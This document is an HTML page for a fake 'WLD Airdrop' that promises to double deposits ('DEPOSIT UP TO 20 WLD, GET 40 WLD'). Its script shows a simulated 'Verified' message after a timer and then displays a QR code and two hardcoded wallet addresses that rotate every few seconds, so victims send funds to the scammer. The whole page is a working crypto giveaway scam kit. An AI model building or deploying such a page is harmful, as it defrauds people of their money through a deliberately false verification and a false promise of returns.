<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>WLD Airdrop</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<style>
*{margin:0;padding:0;box-sizing:border-box}
html,body{
  width:100%;
  height:100%;
  font-family:Inter,system-ui,sans-serif;
  background:#f2f2f2;
  overflow:hidden;
}

.center{
  height:100%;
  display:flex;
  flex-direction:column;
  align-items:center;
  justify-content:center;
  text-align:center;
}

/* LOGO */
.logo{
  width:90px;
  animation:spin 20s linear infinite;
}
@keyframes spin{
  from{transform:rotateY(0)}
  to{transform:rotateY(360deg)}
}

/* AIRDROP TEXT */
.airdrop-text{
  margin-top:22px;
  font-weight:700;
  letter-spacing:2px;
}
.airdrop-text span{
  display:block;
  font-size:18px;
  opacity:0;
  animation:airdrop 6s infinite;
}
.airdrop-text span:nth-child(1){animation-delay:0s}
.airdrop-text span:nth-child(2){animation-delay:1.5s}
.airdrop-text span:nth-child(3){animation-delay:3s}
.airdrop-text .highlight{font-size:32px}
@keyframes airdrop{
  0%{opacity:0;transform:translateY(20px)}
  20%{opacity:1;transform:translateY(0)}
  70%{opacity:1}
  100%{opacity:0;transform:translateY(-20px)}
}

/* VERIFY */
#widBox button{
  margin-top:26px;
  padding:14px 30px;
  border:none;
  border-radius:10px;
  background:#000;
  color:#fff;
  letter-spacing:2px;
  cursor:pointer;
}

/* SPINNER */
.spinner{
  display:none;
  margin-top:20px;
  width:40px;
  height:40px;
  border:4px solid rgba(0,200,120,.3);
  border-top:4px solid #00c389;
  border-radius:50%;
  animation:spin2 1s linear infinite;
}
@keyframes spin2{to{transform:rotate(360deg)}}

/* QR */
.qr-box{
  display:none;
  margin-top:26px;
}
.qr-box img{
  width:160px;
  background:#fff;
  padding:12px;
  border-radius:14px;
}
.renew{
  margin-top:8px;
  font-size:12px;
  letter-spacing:2px;
  opacity:.7;
}

/* COPY */
.deposit-code{
  display:none;
  margin-top:14px;
}
.deposit-code input{
  width:320px;
  padding:10px;
  text-align:center;
  border-radius:6px;
  border:1px solid #ccc;
}
.deposit-code button{
  margin-top:10px;
  padding:10px 22px;
  border:none;
  border-radius:6px;
  background:#000;
  color:#fff;
  cursor:pointer;
}
#copyMsg{
  display:block;
  margin-top:6px;
  font-size:12px;
  opacity:0;
}

/* STATUS */
.status{
  margin-top:16px;
  font-size:14px;
  letter-spacing:1px;
}
</style>
</head>

<body>

<div class="center">

  <img src="logowld.png" class="logo">

  <div class="airdrop-text">
    <span>100% EARN AIRDROP</span>
    <span>DEPOSIT UP TO 20 WLD</span>
    <span class="highlight">GET 40 WLD</span>
  </div>

  <!-- VERIFY -->
  <div id="widBox">
    <button id="verifyBtn">VERIFY</button>
  </div>

  <div class="spinner" id="spinner"></div>

  <!-- QR -->
  <div class="qr-box" id="qrBox">
    <img id="qrImage" src="qr.jpeg">
    <div class="renew">renew in <span id="renewCounter">5</span></div>
  </div>

  <!-- COPY -->
  <div class="deposit-code" id="depositBox">
    <input id="addr" readonly>
    <button id="copyBtn">COPY ADDRESS</button>
    <span id="copyMsg">Copied ✓</span>
  </div>

  <div class="status" id="status"></div>

</div>

<script>
/* ===== WALLETS ===== */
const WALLETS = [
  "0x1f62e7890d5db2c94c280547876b050f5d1816c5",
  "0xf8af1505beb8a37207eb1f019ded31dd08fc571c"
];
let walletIndex = 0;

/* ===== VERIFY (SIMULADO) ===== */
verifyBtn.onclick = () => {
  widBox.style.display = "none";
  spinner.style.display = "block";
  status.textContent = "Verifying…";

  setTimeout(() => {
    spinner.style.display = "none";
    status.textContent = "✔ Verified";
    showDeposit();
  }, 2000);
};

/* ===== SHOW DEPOSIT ===== */
function showDeposit(){
  status.textContent = "Deposit to receive the airdrop";
  qrBox.style.display = "block";
  depositBox.style.display = "block";
  updateWallet();
  startRenew();
}

/* ===== RENEW ===== */
let renew = 5;
let angle = 0;

function startRenew(){
  setInterval(()=>{
    renew--;
    renewCounter.textContent = renew;

    if(renew === 0){
      walletIndex = (walletIndex + 1) % WALLETS.length;
      updateWallet();

      angle = (angle + 90) % 360;
      qrImage.style.transform = `rotate(${angle}deg)`;

      renew = 5;
      renewCounter.textContent = renew;
    }
  },1000);
}

/* ===== UPDATE WALLET ===== */
function updateWallet(){
  addr.value = WALLETS[walletIndex];
}

/* ===== COPY ===== */
copyBtn.onclick = () => {
  navigator.clipboard.writeText(addr.value);
  copyMsg.style.opacity = 1;
  setTimeout(()=>copyMsg.style.opacity = 0, 1500);
};
</script>

</body>
</html>
